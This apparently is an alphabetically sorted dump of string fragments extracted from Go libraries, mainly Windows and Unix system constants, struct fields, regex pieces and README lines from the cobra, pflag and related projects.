WSAENOTCONN                                                               syscall.Errno = 10057
WSAENOTEMPTY                                                              syscall.Errno = 10066
WSAENOTSOCK                                                               syscall.Errno = 10038
WSAEOPNOTSUPP                                                             syscall.Errno = 10045
WSAEPFNOSUPPORT                                                           syscall.Errno = 10046
WSAEPROCLIM                                                               syscall.Errno = 10067
WSAEPROTONOSUPPORT                                                        syscall.Errno = 10043
WSAEPROTOTYPE                                                             syscall.Errno = 10041
WSAEPROVIDERFAILEDINIT                                                    syscall.Errno = 10106
WSAEREFUSED                                                               syscall.Errno = 10112
WSAEREMOTE                                                                syscall.Errno = 10071
WSAESHUTDOWN                                                              syscall.Errno = 10058
WSAESOCKTNOSUPPORT                                                        syscall.Errno = 10044
WSAESTALE                                                                 syscall.Errno = 10070
WSAETIMEDOUT                                                              syscall.Errno = 10060
WSAETOOMANYREFS                                                           syscall.Errno = 10059
WSAEUSERS                                                                 syscall.Errno = 10068
WSAEWOULDBLOCK                                                            syscall.Errno = 10035
WSAEnumProtocols(protocols 
WSAHOST_NOT_FOUND                                                         syscall.Errno = 11001
WSANOTINITIALISED                                                         syscall.Errno = 10093
WSANO_DATA                                                                syscall.Errno = 11004
WSANO_RECOVERY                                                            syscall.Errno = 11003
WSAPROTOCOL_LEN    = 255
WSASERVICE_NOT_FOUND                                                      syscall.Errno = 10108
WSASYSCALLFAILURE                                                         syscall.Errno = 10107
WSASYSNOTREADY                                                            syscall.Errno = 10091
WSASYS_STATUS_LEN  = 128
WSATRY_AGAIN                                                              syscall.Errno = 11002
WSATYPE_NOT_FOUND                                                         syscall.Errno = 10109
WSAVERNOTSUPPORTED                                                        syscall.Errno = 10092
WSA_E_CANCELLED                                                           syscall.Errno = 10111
WSA_E_NO_MORE                                                             syscall.Errno = 10110
WSA_FLAG_ACCESS_SYSTEM_SECURITY = 0x40
WSA_FLAG_MULTIPOINT_C_LEAF      = 0x04
WSA_FLAG_MULTIPOINT_C_ROOT      = 0x02
WSA_FLAG_MULTIPOINT_D_LEAF      = 0x10
WSA_FLAG_MULTIPOINT_D_ROOT      = 0x08
WSA_FLAG_NO_HANDLE_INHERIT      = 0x80
WSA_FLAG_OVERLAPPED             = 0x01
WSA_FLAG_REGISTERED_IO          = 0x100
WSA_IPSEC_NAME_POLICY_ERROR                                               syscall.Errno = 11033
WSA_QOS_ADMISSION_FAILURE                                                 syscall.Errno = 11010
WSA_QOS_BAD_OBJECT                                                        syscall.Errno = 11013
WSA_QOS_BAD_STYLE                                                         syscall.Errno = 11012
WSA_QOS_EFILTERCOUNT                                                      syscall.Errno = 11021
WSA_QOS_EFILTERSTYLE                                                      syscall.Errno = 11019
WSA_QOS_EFILTERTYPE                                                       syscall.Errno = 11020
WSA_QOS_EFLOWCOUNT                                                        syscall.Errno = 11023
WSA_QOS_EFLOWDESC                                                         syscall.Errno = 11026
WSA_QOS_EFLOWSPEC                                                         syscall.Errno = 11017
WSA_QOS_EOBJLENGTH                                                        syscall.Errno = 11022
WSA_QOS_EPOLICYOBJ                                                        syscall.Errno = 11025
WSA_QOS_EPROVSPECBUF                                                      syscall.Errno = 11018
WSA_QOS_EPSFILTERSPEC                                                     syscall.Errno = 11028
WSA_QOS_EPSFLOWSPEC                                                       syscall.Errno = 11027
WSA_QOS_ESDMODEOBJ                                                        syscall.Errno = 11029
WSA_QOS_ESERVICETYPE                                                      syscall.Errno = 11016
WSA_QOS_ESHAPERATEOBJ                                                     syscall.Errno = 11030
WSA_QOS_EUNKOWNPSOBJ                                                      syscall.Errno = 11024
WSA_QOS_GENERIC_ERROR                                                     syscall.Errno = 11015
WSA_QOS_NO_RECEIVERS                                                      syscall.Errno = 11008
WSA_QOS_NO_SENDERS                                                        syscall.Errno = 11007
WSA_QOS_POLICY_FAILURE                                                    syscall.Errno = 11011
WSA_QOS_RECEIVERS                                                         syscall.Errno = 11005
WSA_QOS_REQUEST_CONFIRMED                                                 syscall.Errno = 11009
WSA_QOS_RESERVED_PETYPE                                                   syscall.Errno = 11031
WSA_QOS_SENDERS                                                           syscall.Errno = 11006
WSA_QOS_TRAFFIC_CTRL_ERROR                                                syscall.Errno = 11014
WSA_SECURE_HOST_NOT_FOUND                                                 syscall.Errno = 11032
WSIGMASK                      = 0x7f
WSTOPFLG                      = 0x7f
WSTOPPED                                    = 0x2
WSTOPPED                                = 0x8
WSTOPPED                          = 0x2
WSTOPPED                          = 0x7f
WSTOPPED                       = 0x2
WSTOPPED                      = 0x4
WS_E_ADDRESS_IN_USE                                                       Handle        = 0x803D000B
WS_E_ADDRESS_NOT_AVAILABLE                                                Handle        = 0x803D000C
WS_E_ENDPOINT_ACCESS_DENIED                                               Handle        = 0x803D0005
WS_E_ENDPOINT_ACTION_NOT_SUPPORTED                                        Handle        = 0x803D0011
WS_E_ENDPOINT_DISCONNECTED                                                Handle        = 0x803D0014
WS_E_ENDPOINT_FAILURE                                                     Handle        = 0x803D000F
WS_E_ENDPOINT_FAULT_RECEIVED                                              Handle        = 0x803D0013
WS_E_ENDPOINT_NOT_AVAILABLE                                               Handle        = 0x803D000E
WS_E_ENDPOINT_NOT_FOUND                                                   Handle        = 0x803D000D
WS_E_ENDPOINT_TOO_BUSY                                                    Handle        = 0x803D0012
WS_E_ENDPOINT_UNREACHABLE                                                 Handle        = 0x803D0010
WS_E_INVALID_ENDPOINT_URL                                                 Handle        = 0x803D0020
WS_E_INVALID_FORMAT                                                       Handle        = 0x803D0000
WS_E_INVALID_OPERATION                                                    Handle        = 0x803D0003
WS_E_NOT_SUPPORTED                                                        Handle        = 0x803D0017
WS_E_NO_TRANSLATION_AVAILABLE                                             Handle        = 0x803D0009
WS_E_NUMERIC_OVERFLOW                                                     Handle        = 0x803D0002
WS_E_OBJECT_FAULTED                                                       Handle        = 0x803D0001
WS_E_OPERATION_ABANDONED                                                  Handle        = 0x803D0007
WS_E_OPERATION_ABORTED                                                    Handle        = 0x803D0004
WS_E_OPERATION_TIMED_OUT                                                  Handle        = 0x803D0006
WS_E_OTHER                                                                Handle        = 0x803D0021
WS_E_PROXY_ACCESS_DENIED                                                  Handle        = 0x803D0016
WS_E_PROXY_FAILURE                                                        Handle        = 0x803D0015
WS_E_PROXY_REQUIRES_BASIC_AUTH                                            Handle        = 0x803D0018
WS_E_PROXY_REQUIRES_DIGEST_AUTH                                           Handle        = 0x803D0019
WS_E_PROXY_REQUIRES_NEGOTIATE_AUTH                                        Handle        = 0x803D001B
WS_E_PROXY_REQUIRES_NTLM_AUTH                                             Handle        = 0x803D001A
WS_E_QUOTA_EXCEEDED                                                       Handle        = 0x803D0008
WS_E_SECURITY_SYSTEM_FAILURE                                              Handle        = 0x803D0023
WS_E_SECURITY_TOKEN_EXPIRED                                               Handle        = 0x803D0022
WS_E_SECURITY_VERIFICATION_FAILURE                                        Handle        = 0x803D000A
WS_E_SERVER_REQUIRES_BASIC_AUTH                                           Handle        = 0x803D001C
WS_E_SERVER_REQUIRES_DIGEST_AUTH                                          Handle        = 0x803D001D
WS_E_SERVER_REQUIRES_NEGOTIATE_AUTH                                       Handle        = 0x803D001F
WS_E_SERVER_REQUIRES_NTLM_AUTH                                            Handle        = 0x803D001E
WS_S_ASYNC                                                                Handle        = 0x003D0000
WS_S_END                                                                  Handle        = 0x003D0001
WTD_CACHE_ONLY_URL_RETRIEVAL            = 0x1000
WTD_CHOICE_BLOB    = 3
WTD_CHOICE_CATALOG = 2
WTD_CHOICE_CERT    = 5
WTD_CHOICE_FILE    = 1
WTD_CHOICE_SIGNER  = 4
WTD_DISABLE_MD2_MD4                     = 0x2000
WTD_HASH_ONLY_FLAG                      = 0x200
WTD_LIFETIME_SIGNING_FLAG               = 0x800
WTD_MOTW                                = 0x4000
WTD_NO_IE4_CHAIN_FLAG                   = 0x2
WTD_NO_POLICY_USAGE_FLAG                = 0x4
WTD_REVOCATION_CHECK_CHAIN              = 0x40
WTD_REVOCATION_CHECK_CHAIN_EXCLUDE_ROOT = 0x80
WTD_REVOCATION_CHECK_END_CERT           = 0x20
WTD_REVOCATION_CHECK_NONE               = 0x10
WTD_REVOKE_NONE       = 0
WTD_REVOKE_WHOLECHAIN = 1
WTD_SAFER_FLAG                          = 0x100
WTD_STATEACTION_AUTO_CACHE       = 0x00000003
WTD_STATEACTION_AUTO_CACHE_FLUSH = 0x00000004
WTD_STATEACTION_CLOSE            = 0x00000002
WTD_STATEACTION_IGNORE           = 0x00000000
WTD_STATEACTION_VERIFY           = 0x00000001
WTD_UICONTEXT_EXECUTE = 0
WTD_UICONTEXT_INSTALL = 1
WTD_UI_ALL    = 1
WTD_UI_NOBAD  = 3
WTD_UI_NOGOOD = 4
WTD_UI_NONE   = 2
WTD_USE_DEFAULT_OSVER_CHECK             = 0x400
WTD_USE_IE4_TRUST_FLAG                  = 0x1
WTRAPPED                          = 0x20
WTRAPPED                       = 0x20
WTRAPPED                      = 0x2
WTSActive       = 0
WTSConnectQuery = 2
WTSConnected    = 1
WTSDisconnected = 4
WTSDown         = 8
WTSIdle         = 5
WTSInit         = 9
WTSListen       = 6
WTSReset        = 7
WTSShadow       = 3
WTS_CONSOLE_CONNECT        = 0x1
WTS_CONSOLE_DISCONNECT     = 0x2
WTS_REMOTE_CONNECT         = 0x3
WTS_REMOTE_DISCONNECT      = 0x4
WTS_SESSION_CREATE         = 0xa
WTS_SESSION_LOCK           = 0x7
WTS_SESSION_LOGOFF         = 0x6
WTS_SESSION_LOGON          = 0x5
WTS_SESSION_REMOTE_CONTROL = 0x9
WTS_SESSION_TERMINATE      = 0xb
WTS_SESSION_UNLOCK         = 0x8
WUNTRACED                                   = 0x2
WUNTRACED                               = 0x2
WUNTRACED                         = 0x2
WUNTRACED                       = 0x2
WUNTRACED                      = 0x2
WUNTRACED                     = 0x4
W[A-Z0-9]
W_OK = 0x2
WaitHint                uint32
Waitmsg) (err error) {
Wakeup             uint32
Wd     int32
Wday  int32
We definitely welcome patches and contribution to this project!
We have only defined one flag for a single command.
We will maintain two major releases in a moving window. The N-1 release will only receive bug fixes and security updates and will be dropped once N
Weight   uint16
Weight   uint32
Weight   uint64
Weight uint8
What    uint16
When debugging with the 
When using the default 
Whence int16
Where 
Win32ExitCode           uint32
Win32finddata) (err error) {
WinAccountAdministratorSid                    = 38
WinAccountCertAdminsSid                       = 46
WinAccountCloneableControllersSid             = 100
WinAccountComputersSid                        = 44
WinAccountControllersSid                      = 45
WinAccountDefaultSystemManagedSid             = 110
WinAccountDomainAdminsSid                     = 41
WinAccountDomainGuestsSid                     = 43
WinAccountDomainUsersSid                      = 42
WinAccountEnterpriseAdminsSid                 = 48
WinAccountEnterpriseKeyAdminsSid              = 114
WinAccountGuestSid                            = 39
WinAccountKeyAdminsSid                        = 113
WinAccountKrbtgtSid                           = 40
WinAccountPolicyAdminsSid                     = 49
WinAccountProtectedUsersSid                   = 107
WinAccountRasAndIasServersSid                 = 50
WinAccountReadonlyControllersSid              = 75
WinAccountSchemaAdminsSid                     = 47
WinAnonymousSid                               = 13
WinApplicationPackageAuthoritySid             = 83
WinAuthenticatedUserSid                       = 17
WinAuthenticationAuthorityAssertedSid         = 103
WinAuthenticationFreshKeyAuthSid              = 118
WinAuthenticationKeyPropertyAttestationSid    = 117
WinAuthenticationKeyPropertyMFASid            = 116
WinAuthenticationKeyTrustSid                  = 115
WinAuthenticationServiceAssertedSid           = 104
WinBatchSid                                   = 10
WinBuiltinAccessControlAssistanceOperatorsSid = 101
WinBuiltinAccountOperatorsSid                 = 30
WinBuiltinAdministratorsSid                   = 26
WinBuiltinAnyPackageSid                       = 84
WinBuiltinAuthorizationAccessSid              = 59
WinBuiltinBackupOperatorsSid                  = 33
WinBuiltinCertSvcDComAccessGroup              = 78
WinBuiltinCryptoOperatorsSid                  = 64
WinBuiltinDCOMUsersSid                        = 61
WinBuiltinDefaultSystemManagedGroupSid        = 111
WinBuiltinDeviceOwnersSid                     = 119
WinBuiltinDomainSid                           = 25
WinBuiltinEventLogReadersGroup                = 76
WinBuiltinGuestsSid                           = 28
WinBuiltinHyperVAdminsSid                     = 99
WinBuiltinIUsersSid                           = 62
WinBuiltinIncomingForestTrustBuildersSid      = 56
WinBuiltinNetworkConfigurationOperatorsSid    = 37
WinBuiltinPerfLoggingUsersSid                 = 58
WinBuiltinPerfMonitoringUsersSid              = 57
WinBuiltinPowerUsersSid                       = 29
WinBuiltinPreWindows2000CompatibleAccessSid   = 35
WinBuiltinPrintOperatorsSid                   = 32
WinBuiltinRDSEndpointServersSid               = 96
WinBuiltinRDSManagementServersSid             = 97
WinBuiltinRDSRemoteAccessServersSid           = 95
WinBuiltinRemoteDesktopUsersSid               = 36
WinBuiltinRemoteManagementUsersSid            = 102
WinBuiltinReplicatorSid                       = 34
WinBuiltinStorageReplicaAdminsSid             = 112
WinBuiltinSystemOperatorsSid                  = 31
WinBuiltinTerminalServerLicenseServersSid     = 60
WinBuiltinUsersSid                            = 27
WinCacheablePrincipalsGroupSid                = 72
WinCapabilityAppointmentsSid                  = 108
WinCapabilityContactsSid                      = 109
WinCapabilityDocumentsLibrarySid              = 91
WinCapabilityEnterpriseAuthenticationSid      = 93
WinCapabilityInternetClientServerSid          = 86
WinCapabilityInternetClientSid                = 85
WinCapabilityMusicLibrarySid                  = 90
WinCapabilityPicturesLibrarySid               = 88
WinCapabilityPrivateNetworkClientServerSid    = 87
WinCapabilityRemovableStorageSid              = 94
WinCapabilitySharedUserCertificatesSid        = 92
WinCapabilityVideosLibrarySid                 = 89
WinConsoleLogonSid                            = 81
WinCreatorGroupServerSid                      = 6
WinCreatorGroupSid                            = 4
WinCreatorOwnerRightsSid                      = 71
WinCreatorOwnerServerSid                      = 5
WinCreatorOwnerSid                            = 3
WinDialupSid                                  = 8
WinDigestAuthenticationSid                    = 52
WinEnterpriseControllersSid                   = 15
WinEnterpriseReadonlyControllersSid           = 74
WinHighLabelSid                               = 68
WinIUserSid                                   = 63
WinInteractiveSid                             = 11
WinLocalAccountAndAdministratorSid            = 106
WinLocalAccountSid                            = 105
WinLocalLogonSid                              = 80
WinLocalServiceSid                            = 23
WinLocalSid                                   = 2
WinLocalSystemSid                             = 22
WinLogonIdsSid                                = 21
WinLowLabelSid                                = 66
WinMediumLabelSid                             = 67
WinMediumPlusLabelSid                         = 79
WinNTLMAuthenticationSid                      = 51
WinNetworkServiceSid                          = 24
WinNetworkSid                                 = 9
WinNewEnterpriseReadonlyControllersSid        = 77
WinNonCacheablePrincipalsGroupSid             = 73
WinNtAuthoritySid                             = 7
WinNullSid                                    = 0
WinOtherOrganizationSid                       = 55
WinProxySid                                   = 14
WinRemoteLogonIdSid                           = 20
WinRestrictedCodeSid                          = 18
WinSChannelAuthenticationSid                  = 53
WinSelfSid                                    = 16
WinServiceSid                                 = 12
WinSystemLabelSid                             = 69
WinTerminalServerSid                          = 19
WinThisOrganizationCertificateSid             = 82
WinThisOrganizationSid                        = 54
WinTrustData) (ret error) = wintrust.WinVerifyTrustEx
WinTrustData) (ret error) {
WinTrustSignatureSettings
WinUntrustedLabelSid                          = 65
WinUserModeDriversSid                         = 98
WinWorldSid                                   = 1
WinWriteRestrictedCodeSid                     = 70
Window            SmallRect
WindowStationName 
Windows
Winsize argument.
Winsize) (
Winsize) error {
Wired              int32
Wiredmax           int32
With the root command you need to have your main function execute it.
Wmesg   [8]byte
Word127        uint16
Word156        uint16
Words104_125   [22]uint16
Words130_155   [26]uint16
Words157_159   [3]uint16
Words161_175   [15]uint16
Words176_205   [30]uint16
Words206_254   [49]uint16
Words69_70     [2]uint16
Words71_74     [4]uint16
Words76_79     [4]uint16
WorkingSetPrivateSize        int64
WorkingSetSize               uintptr
Would result in something like
Wpcopy_count              uint64
Wpcopy_delay_total        uint64
WriteOperationCount          int64
WriteOperationCount uint64
WriteTotalTimeoutConstant   uint32
WriteTotalTimeoutMultiplier uint32
WriteTransferCount           int64
WriteTransferCount  uint64
Write_bytes               uint64
Write_char                uint64
Write_syscalls            uint64
Writesize uint32
X             uint32
X    [30]uint64
X    uint16 // ws_xpixel: Width in pixels
X int16
X509_ASN_ENCODING   = 0x00000001
X86_FXSR_MAGIC                   = 0x0
XACT_E_ABORTED                                                            Handle        = 0x8004D019
XACT_E_ABORTING                                                           Handle        = 0x8004D029
XACT_E_ALREADYINPROGRESS                                                  Handle        = 0x8004D018
XACT_E_ALREADYOTHERSINGLEPHASE                                            Handle        = 0x8004D000
XACT_E_CANTRETAIN                                                         Handle        = 0x8004D001
XACT_E_CLERKEXISTS                                                        Handle        = 0x8004D081
XACT_E_CLERKNOTFOUND                                                      Handle        = 0x8004D080
XACT_E_COMMITFAILED                                                       Handle        = 0x8004D002
XACT_E_COMMITPREVENTED                                                    Handle        = 0x8004D003
XACT_E_CONNECTION_DENIED                                                  Handle        = 0x8004D01D
XACT_E_CONNECTION_DOWN                                                    Handle        = 0x8004D01C
XACT_E_DEST_TMNOTAVAILABLE                                                Handle        = 0x8004D022
XACT_E_FIRST                                                              syscall.Errno = 0x8004D000
XACT_E_HEURISTICABORT                                                     Handle        = 0x8004D004
XACT_E_HEURISTICCOMMIT                                                    Handle        = 0x8004D005
XACT_E_HEURISTICDAMAGE                                                    Handle        = 0x8004D006
XACT_E_HEURISTICDANGER                                                    Handle        = 0x8004D007
XACT_E_INDOUBT                                                            Handle        = 0x8004D016
XACT_E_INVALIDCOOKIE                                                      Handle        = 0x8004D015
XACT_E_INVALIDLSN                                                         Handle        = 0x8004D084
XACT_E_ISOLATIONLEVEL                                                     Handle        = 0x8004D008
XACT_E_LAST                                                               syscall.Errno = 0x8004D02B
XACT_E_LOGFULL                                                            Handle        = 0x8004D01A
XACT_E_LU_TX_DISABLED                                                     Handle        = 0x8004D02C
XACT_E_NETWORK_TX_DISABLED                                                Handle        = 0x8004D024
XACT_E_NOASYNC                                                            Handle        = 0x8004D009
XACT_E_NOENLIST                                                           Handle        = 0x8004D00A
XACT_E_NOIMPORTOBJECT                                                     Handle        = 0x8004D014
XACT_E_NOISORETAIN                                                        Handle        = 0x8004D00B
XACT_E_NORESOURCE                                                         Handle        = 0x8004D00C
XACT_E_NOTCURRENT                                                         Handle        = 0x8004D00D
XACT_E_NOTIMEOUT                                                          Handle        = 0x8004D017
XACT_E_NOTRANSACTION                                                      Handle        = 0x8004D00E
XACT_E_NOTSUPPORTED                                                       Handle        = 0x8004D00F
XACT_E_PARTNER_NETWORK_TX_DISABLED                                        Handle        = 0x8004D025
XACT_E_PULL_COMM_FAILURE                                                  Handle        = 0x8004D02B
XACT_E_PUSH_COMM_FAILURE                                                  Handle        = 0x8004D02A
XACT_E_RECOVERYINPROGRESS                                                 Handle        = 0x8004D082
XACT_E_REENLISTTIMEOUT                                                    Handle        = 0x8004D01E
XACT_E_REPLAYREQUEST                                                      Handle        = 0x8004D085
XACT_E_TIP_CONNECT_FAILED                                                 Handle        = 0x8004D01F
XACT_E_TIP_DISABLED                                                       Handle        = 0x8004D023
XACT_E_TIP_PROTOCOL_ERROR                                                 Handle        = 0x8004D020
XACT_E_TIP_PULL_FAILED                                                    Handle        = 0x8004D021
XACT_E_TMNOTAVAILABLE                                                     Handle        = 0x8004D01B
XACT_E_TRANSACTIONCLOSED                                                  Handle        = 0x8004D083
XACT_E_UNABLE_TO_LOAD_DTC_PROXY                                           Handle        = 0x8004D028
XACT_E_UNABLE_TO_READ_DTC_CONFIG                                          Handle        = 0x8004D027
XACT_E_UNKNOWNRMGRID                                                      Handle        = 0x8004D010
XACT_E_WRONGSTATE                                                         Handle        = 0x8004D011
XACT_E_WRONGUOW                                                           Handle        = 0x8004D012
XACT_E_XA_TX_DISABLED                                                     Handle        = 0x8004D026
XACT_E_XTIONEXISTS                                                        Handle        = 0x8004D013
XACT_S_ABORTING                                                           Handle        = 0x0004D008
XACT_S_ALLNORETAIN                                                        Handle        = 0x0004D007
XACT_S_ASYNC                                                              Handle        = 0x0004D000
XACT_S_DEFECT                                                             Handle        = 0x0004D001
XACT_S_FIRST                                                              syscall.Errno = 0x0004D000
XACT_S_LAST                                                               syscall.Errno = 0x0004D010
XACT_S_LASTRESOURCEMANAGER                                                Handle        = 0x0004D010
XACT_S_LOCALLY_OK                                                         Handle        = 0x0004D00A
XACT_S_MADECHANGESCONTENT                                                 Handle        = 0x0004D005
XACT_S_MADECHANGESINFORM                                                  Handle        = 0x0004D006
XACT_S_OKINFORM                                                           Handle        = 0x0004D004
XACT_S_READONLY                                                           Handle        = 0x0004D002
XACT_S_SINGLEPHASE                                                        Handle        = 0x0004D009
XACT_S_SOMENORETAIN                                                       Handle        = 0x0004D003
XATTR_(CREATE
XATTR_CREATE                                = 0x1
XATTR_CREATE                            = 0x2
XATTR_NODEFAULT                         = 0x10
XATTR_NOFOLLOW                          = 0x1
XATTR_NOFOLLOW)
XATTR_NOSECURITY                        = 0x8
XATTR_REPLACE                               = 0x2
XATTR_REPLACE                           = 0x4
XATTR_SHOWCOMPRESSION                   = 0x20
XCASE                             = 0x1000000
XCASE                            = 0x4
XCASE                            = 0x4000
XCASE                         = 0x4
XCountChars   uint32
XDP_/ 
XDP_COPY                                    = 0x2
XDP_FLAGS_DRV_MODE                          = 0x4
XDP_FLAGS_HW_MODE                           = 0x8
XDP_FLAGS_MASK                              = 0x1f
XDP_FLAGS_MODES                             = 0xe
XDP_FLAGS_REPLACE                           = 0x10
XDP_FLAGS_SKB_MODE                          = 0x2
XDP_FLAGS_UPDATE_IF_NOEXIST                 = 0x1
XDP_MMAP_OFFSETS                            = 0x1
XDP_OPTIONS                                 = 0x8
XDP_OPTIONS_ZEROCOPY                        = 0x1
XDP_PACKET_HEADROOM                         = 0x100
XDP_PGOFF_RX_RING                           = 0x0
XDP_PGOFF_TX_RING                           = 0x80000000
XDP_RING_NEED_WAKEUP                        = 0x1
XDP_RX_RING                                 = 0x2
XDP_SHARED_UMEM                             = 0x1
XDP_STATISTICS                              = 0x7
XDP_TX_RING                                 = 0x3
XDP_UMEM_COMPLETION_RING                    = 0x6
XDP_UMEM_FILL_RING                          = 0x5
XDP_UMEM_PGOFF_COMPLETION_RING              = 0x180000000
XDP_UMEM_PGOFF_FILL_RING                    = 0x100000000
XDP_UMEM_REG                                = 0x4
XDP_UMEM_UNALIGNED_CHUNK_FLAG               = 0x1
XDP_USE_NEED_WAKEUP                         = 0x8
XDP_ZEROCOPY                                = 0x4
XENFS_SUPER_MAGIC                           = 0xabba1974
XENROLL_E_CANNOT_ADD_ROOT_CERT                                            Handle        = 0x80095001
XENROLL_E_KEYSPEC_SMIME_MISMATCH                                          Handle        = 0x80095005
XENROLL_E_KEY_NOT_EXPORTABLE                                              Handle        = 0x80095000
XENROLL_E_RESPONSE_KA_HASH_MISMATCH                                       Handle        = 0x80095004
XENROLL_E_RESPONSE_KA_HASH_NOT_FOUND                                      Handle        = 0x80095002
XENROLL_E_RESPONSE_UNEXPECTED_KA_HASH                                     Handle        = 0x80095003
XFS_SUPER_MAGIC                             = 0x58465342
XONC)$/ 
XP1_CONNECTIONLESS           = 0x00000001
XP1_CONNECT_DATA             = 0x00000080
XP1_DISCONNECT_DATA          = 0x00000100
XP1_EXPEDITED_DATA           = 0x00000040
XP1_GRACEFUL_CLOSE           = 0x00000020
XP1_GUARANTEED_DELIVERY      = 0x00000002
XP1_GUARANTEED_ORDER         = 0x00000004
XP1_IFS_HANDLES              = 0x00020000
XP1_MESSAGE_ORIENTED         = 0x00000008
XP1_MULTIPOINT_CONTROL_PLANE = 0x00000800
XP1_MULTIPOINT_DATA_PLANE    = 0x00001000
XP1_PARTIAL_MESSAGE          = 0x00040000
XP1_PSEUDO_STREAM            = 0x00000010
XP1_QOS_SUPPORTED            = 0x00002000
XP1_SAN_SUPPORT_SDP          = 0x00080000
XP1_SUPPORT_BROADCAST        = 0x00000200
XP1_SUPPORT_MULTIPOINT       = 0x00000400
XP1_UNI_RECV                 = 0x00010000
XP1_UNI_SEND                 = 0x00008000
XSize         uint32
XTABS                            = 0x1800
XTABS                            = 0xc00
XTABS                         = 0x1800
XTABS                         = 0xc00
XTABS$/ 
X_OK = 0x1
X__d_padding [4]uint8
X__fsid_val [2]int32
X__rsvd         uint32
X__st_birthtim Timespec
X_reason [32]byte
X_sysctl_desc   [8]byte
X_sysctl_func   [8]byte
X_sysctl_parent [8]byte
X_sysctl_size   [8]byte
Xacc  [16][16]uint8
Xccount int16
Xcs      int32
Xds      int32
Xer       uint32
Xer       uint64
Xes      int32
Xflags  int32
Xfs      int32
Xgs      int32
Xmitquota  uint8
Xmittiming uint32
Xpixel uint16
Xrssize int16
Xsize   int32
Xso_family   int32
Xso_len      uint32
Xso_protocol int32
Xso_so       uint32
Xss      int32
Xswrss  int16
Xv_len           uint32
Xv_socket        XSocket
Xv_vsockpp       uint64
Xvp_gencnt       uint64
Xvp_last_pid     int32
Xvp_local_cid    uint32
Xvp_local_port   uint32
Xvp_peer_rxcnt   uint32
Xvp_peer_rxhiwat uint32
Xvp_remote_cid   uint32
Xvp_remote_port  uint32
Xvp_rxcnt        uint32
Xvp_txcnt        uint32
Y             uint32
Y      uint32
Y    uint16 // ws_ypixel: Height in pixels
Y int16
YCountChars   uint32
YSize         uint32
Yday  int32
Year         uint16
Year  int32
You can also bind your flags with [viper](https://github.com/spf13/viper):
You can also configure 
You can also easily debug your Go completion code for flags:
You can also explicitly set names for which a given command will be suggested using the 
You can also prevent different flags from being provided together if they represent mutually 
You can nest tags as deeply as you like.
You can provide your own Help command or your own template for the default command to use
You can provide your own usage function or template for Cobra to use.
You can see the full reference documentation of the pflag package
You may add additional accurate notices of copyright ownership.
You may have already signed it for other Google projects.
You may have noticed the use of 
You may include the notice in a location (such as a LICENSE file in a relevant
You may obtain a copy of the License at
You may recognize this from the help above. That's because the default help
You must choose a name for the repo you are adding
You must choose a name for the repo you are adding.
You must first specify the chart to install before the --version flag can be completed
You must specify the URL for the repo you are adding
You need to open cmd.exe and run it from there.
You set the mode with 
You will additionally define flags and handle configuration in your init() function.
You will need to start a new shell for this setup to take effect.
You will optionally provide additional commands as you see fit.
Your
Ypixel uint16
Yt0cT9FVwsbnV/wsd4XLszbIXXCXwe/cwrs/hxSkPN1FA9Tom9Qho5DPlI4
Z3FOLD_MAGIC                                = 0x33
ZA_MAGIC                         = 0x54366345
ZONEFS_MAGIC                                = 0x5a4f4653
ZONEPT  = (int32('P') << 8) 
ZSMALLOC_MAGIC                              = 0x58295829
Zero      [3]uint8
Zero   [8]int8
Zero   [8]uint8
Zeroaborts         int32
Zeropages          int32
ZoneId uint32
ZoneIndices           [16]uint32
Zsh:
[![Build Status](https://circleci.com/gh/hashicorp/go-version/tree/main.svg
[![Build Status](https://travis-ci.org/spf13/pflag.svg
[![Go Reference](https://pkg.go.dev/badge/github.com/spf13/cobra.svg)](https://pkg.go.dev/github.com/spf13/cobra)
[![Go Reference](https://pkg.go.dev/badge/golang.org/x/term.svg)](https://pkg.go.dev/golang.org/x/term)
[![Go Report Card](https://goreportcard.com/badge/github.com/spf13/cobra)](https://goreportcard.com/report/github.com/spf13/cobra)
[![Go Report Card](https://goreportcard.com/badge/github.com/spf13/pflag)](https://goreportcard.com/report/github.com/spf13/pflag)
[![GoDoc](https://godoc.org/github.com/google/uuid
[![GoDoc](https://godoc.org/github.com/hashicorp/go-version
[![GoDoc](https://godoc.org/github.com/liamg/tml
[![GoDoc](https://godoc.org/github.com/spf13/pflag
[![Slack](https://img.shields.io/badge/Slack-cobra-brightgreen)](https://gophers.slack.com/archives/CD3LP1199)
[![](https://img.shields.io/github/workflow/status/spf13/cobra/Test
[(1 << 27) - 1]LUIDAndAttributes)(unsafe.Pointer(
[(1 << 28) - 1]SIDAndAttributes)(unsafe.Pointer(
[(1 << 31) - 1]byte)(unsafe.Pointer(winHeapACL))[:len(aclBytes):len(aclBytes)])
[._]
[._]s[a-w][a-z]
[0-9
[0-9A-Fa-f]
[0-9A-Za-z
[0-9]
[0-9a-fA-F]
[0xffff]uint16)(unsafe.Pointer(
[1 << 30]byte)(unsafe.Pointer(uintptr(unsafe.Pointer(
[1024]uint8)(cstr)
[1]: http://www.gnu.org/software/libc/manual/html_node/Argument-Syntax.html
[1]byte)(unsafe.Pointer(
[256]uint16)(unsafe.Pointer(s))[:])
[2]: http://localhost:6060/pkg/github.com/spf13/pflag
[2]Timespec)(unsafe.Pointer(
[2]Timeval) (err error)
[2]Timeval) (err error) = SYS___UTIMES_A
[2]Timeval) (err error) {
[2]Timeval)(unsafe.Pointer(
[2]_C_int) (err error)
[2]_C_int) (err error) {
[2]byte)(unsafe.Pointer(
[2]int32) (err error)
[2]int32) (err error) = libsocket.__xnet_socketpair
[2]int32) (err error) {
[2]int32) error {
[3]: http://godoc.org/github.com/spf13/pflag
[4]byte)(unsafe.Pointer(
[568].out
[568vq].out
[8192]
[8192]uint16)(unsafe.Pointer(r0))
[8]byte)(unsafe.Pointer(
[A-Z0-9_]
[A-Z][A-Z0-9_]
[BIS]P
[Contributor License Agreement](https://cla.developers.google.com/clas).
[ES]
[GS]ETFLAGS)/ 
[GoDoc](http://godoc.org/github.com/hashicorp/go-version).
[More about cobra.Command](https://pkg.go.dev/github.com/spf13/cobra
[RFC 4122](http://tools.ietf.org/html/rfc4122)
[SD]I
[[ $line =
[[ -n $key 
[[ -n $knownfolders ]] 
[[ -n $ntstatus ]] 
[[ -n $winerror ]] 
[[5A
[[A or 
[]bool
[]bool {
[]bool) 
[]byte {
[]byte(s)[0])
[]byte) 
[]byte)(unsafe.Pointer(
[]float32
[]float32 {
[]float32) 
[]float64
[]float64 {
[]float64) 
[]int
[]int {
[]int) 
[]int32
[]int32 {
[]int32) 
[]int64
[]int64 {
[]int64) 
[]net.IP
[]net.IP {
[]net.IP) 
[]string
[]string {
[]string) 
[]string{
[]time.Duration
